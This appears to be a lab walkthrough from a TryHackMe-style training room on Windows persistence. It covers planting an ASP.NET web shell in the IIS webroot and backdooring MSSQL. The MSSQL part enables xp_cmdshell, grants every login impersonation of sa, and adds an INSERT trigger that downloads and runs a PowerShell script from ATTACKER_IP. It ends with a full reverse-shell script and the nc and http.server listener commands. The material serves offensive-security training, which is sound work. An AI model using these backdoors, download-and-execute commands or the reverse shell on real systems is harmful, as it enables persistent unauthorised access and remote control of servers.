---
title: 7. Persisting through existing services ☎️
---
If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you. This task will look at how to plant backdoors in a typical web server setup. Still, any other application where you have some degree of control on what gets executed should be backdoorable similarly. The possibilities are endless!

## Using Web Shells

The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is `iis apppool\defaultapppool`. Even if this is an unprivileged user, it has the special `SeImpersonatePrivilege`, providing an easy way to escalate to the Administrator using various known exploits. For more information on how to abuse this privilege, see the [Windows Privesc Room](https://tryhackme.com/room/windowsprivesc20).

Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx), but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory:

```shell
C:\> move shell.aspx C:\inetpub\wwwroot\
```

**Note:** Depending on the way you create/transfer `shell.aspx`, the permissions in the file may not allow the web server to access it. If you are getting a Permission Denied error while accessing the shell's URL, just grant everyone full permissions on the file to get it working. You can do so with `icacls shell.aspx /grant Everyone:F`.

We can then run commands from the web server by pointing to the following URL:

`http://10.10.241.36/shell.aspx`

![](Pasted%20image%2020240204175747.png)

While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.

## Using MSSQL as a Backdoor

There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. Simply put, **triggers** in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any INSERT into the `HRDB` database.

Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the `xp_cmdshell` stored procedure. `xp_cmdshell` is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.

To enable it, let's open `Microsoft SQL Server Management Studio 18`, available from the start menu. When asked for authentication, just use **Windows Authentication** (the default value), and you will be logged on with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.

Once logged in, click on the **New Query** button to open the query editor:

![](Pasted%20image%2020240204175808.png)

Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable `xp_cmdshell`.

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

After this, we must ensure that any website accessing the database can run `xp_cmdshell`. By default, only database users with the `sysadmin` role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the `sa` user, which is the default database administrator:

```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

After all of this, we finally configure a trigger. We start by changing to the `HRDB` database:

```sql
USE HRDB
```

Our trigger will leverage `xp_cmdshell` to execute Powershell to download and run a `.ps1` file from a web server controlled by the attacker. The trigger will be configured to execute whenever an `INSERT` is made into the `Employees` table of the `HRDB` database:

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

Now that the backdoor is set up, let's create `evilscript.ps1` in our attacker's machine, which will contain a Powershell reverse shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

We will need to open two terminals to handle the connections involved in this exploit:

- The trigger will perform the first connection to download and execute `evilscript.ps1`. Our trigger is using port 8000 for that.
- The second connection will be a reverse shell on port 4454 back to our attacker machine.

```shell
user@AttackBox$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
```

```shell
user@AttackBox$ nc -lvp 4454
Listening on 0.0.0.0 4454
```

With all that ready, let's navigate to `http://10.10.241.36/` and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.

